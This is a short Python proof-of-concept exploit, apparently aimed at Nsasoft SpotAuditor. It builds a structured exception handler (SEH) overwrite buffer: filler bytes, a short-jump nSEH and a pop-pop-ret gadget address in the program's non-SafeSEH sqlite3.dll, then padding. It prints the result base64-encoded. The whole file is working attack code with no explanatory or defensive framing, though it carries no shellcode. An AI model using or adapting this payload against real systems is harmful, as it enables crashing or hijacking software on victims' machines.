import base64, struct

head = "A" * 1024
nseh = "\x41\x41\xeb\x0c"               # filler 0x41, 0xeb 0x0c = jmp few bytes only
seh = struct.pack("<I", 0x61e0b194)     # 0x61e0b194 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.15.2 (C:\Program Files\Nsasoft\SpotAuditor\sqlite3.dll)
junk = "C" * (5000 - 1028 - 4 - 4)

payload = head + nseh + seh + junk

print (base64.b64encode(payload))
